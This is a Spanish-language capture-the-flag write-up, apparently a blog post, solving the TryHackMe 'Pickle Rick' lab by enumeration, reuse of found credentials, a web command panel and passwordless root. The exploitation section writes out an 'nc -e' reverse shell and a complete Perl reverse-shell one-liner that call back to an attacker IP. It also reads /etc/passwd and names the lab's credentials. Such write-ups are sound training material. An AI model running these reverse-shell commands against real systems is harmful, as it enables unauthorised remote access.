---
layout: single
title: Pickle Rickkkk - Try Hack me
excerpt: "Pickle rick, maquina Linux basada en Dirbuster y linux, este es mi primer reto
          CTF, ¡vamos a ver la solución del mismo!"

classes: wide
header:
  teaser: /assets/images/thm-picklerick/1.png
  teaser_home_page: true
  icon: /assets/images/thm.webp
categories:
  - TryHackMe
  - CTF
tags:  
  - Linux
  - CTF
  - Dirbuster
  - Easy
  
---

![](/assets/images/thm-picklerick/1.png)

Pickle rick, maquina Linux basada en Dirbuster y linux, este es mi primer reto
CTF, ¡vamos a ver la solución del mismo!

## Fase de enumeración

Vamos a hacer un escaneo de puertos con Nmap. Nmap -sC -ssV 10.10.104.37 -o PortsNmap

Además vamos a ejecutar un escaneo de directorios con Nmap → nmap –script http-enum 10.10.104.37 -Pn

-sC -sV → Usar scripts más comunes y mostrar versiones, -o Guardar escaneo en archivo.

![](/assets/images/thm-picklerick/2.png)

Vemos que tenemos dos puertos abiertos el 80 y el 22 , intuyo que al ser una maquina sencilla y basada en linux y dirbuster no creo que sea necesario probar ssh.

Además Nmap a logrado darnos dos directorios interesantes lo cual refuerza mi intuición anterior.

Ahora vamos hacer uso de la herramienta gobuster para busqueda de directorios, usaremos el comando: gobuster dir -u http://10.10.104.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php.html.txt 

-Hacemos uso de la wordlist y filtramos con el comando -x por .php .html y .txt

![](/assets/images/thm-picklerick/3.png)

Parece que gobuster no nos va a facilitar mucha más información, así que voy a cortarlo y vamos directamente a la pagina web.

## Fase de explotación

-Una vez en la web vemos esto:

![](/assets/images/thm-picklerick/4.png)

A simple vista no vemos nada interesante, pero siempre hay que mirar el código fuente y el wappalyzer.

![](/assets/images/thm-picklerick/5.png)

Vemos que en la pagina de inicio tenemos un posible nombre de usuario: R1ckRul3s

Ahora vamos a indagar por los siguientes directorios que conocemos. (robots.txt / login.php / assets)

Recordamos siempre mirar en cada apartado el código fuente y el wappalyzer

En robots.txt Nos encontramos con una posible contraseña. Wubbalubbadubdub

![](/assets/images/thm-picklerick/6.png)

En assets encontramos los archivos de la página.

![](/assets/images/thm-picklerick/7.png)

En el apartado login.php , encontramos un login vamos a probar con las credenciales previamente encontradas: User: R1ckRul3s , Pass: Wubbalubbadubdub 

![](/assets/images/thm-picklerick/8.png)

Y conseguimos acceso a este portal.php

![](/assets/images/thm-picklerick/9.png)

Si hacemos un whoami por ejemplo , vemos que estamos frente a una web shell, podríamos probar a hacer una reverse shell y traernosla directamente a neuestro equipo local, o podriamos empezar a introducir comandos como , ls -lia , whoami , id… Ir buscando entre archivos y directorios cosas interesantes.

![](/assets/images/thm-picklerick/10.png)

Vemos que ya vemos varias cosas interesantes como los .txt , viendo que los tiros van a ir todos por aquí vamos a intentar obtener directamente una reverse shell en nuestro equipo para trabajar con más comodidad. Con el comando ‘whereis’ vamos a comprobar si tiene instalado por ejemplo netcat para obtener una revershell de manera sencilla, En la maquina objetiva introducimos el comando ‘nc -e /bin/sh 10.9.3.248 4444’ y en nuestro equipo nos ponemos en escucha con el comando nc -lvnp 4444 , ejecutamos y vemos que no ganamos acceso, parece que algo esta capado, Vamos a investigar por google y nos encontramos con esta página: Web y ahora probaremos con:
 
``` 
perl -e 'use Socket;$i="10.9.3.248";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

y nosotros estaremos en escucha: nc -lvnp 4444 , conseguimos acceso.

![](/assets/images/thm-picklerick/11.png)

Ahora vamos a ver el contenido de los archivos .txt

![](/assets/images/thm-picklerick/12.png)

Vemos que conseguimos la primera flag y el otro archivo nos indica que busquemos dentro de los archivos del sistema para conseguir los otros ingredientes.

Vamos a probar principalmente a listar los contenidos de / etc / passwd , listar contenidos de /home y /root

![](/assets/images/thm-picklerick/13.png)

Vemos que en / etc / passwd , no encontramos nada interesante , ningun usuario extraño…

Ahora vamos a mirar en los usuarios de /home

![](/assets/images/thm-picklerick/14.png)

Bingo, encontramos el directorio del usuario rick y una vez dentro obtenemos un .txt del segundo ingrediente y conseguimos la segunda flag.

Por último vamos a mirar el directorio /root para ver que encontramos 

![](/assets/images/thm-picklerick/15.png)

Vemos que no nos pide contraseña para usar el super usuario, asi que listamos el contenido y vemos un archivo que aparentemente podría ser nuestra última flag y efectivamente, conseguimos las 3 flags y Rick volvera a ser humano.

![](/assets/images/thm-picklerick/16.png)

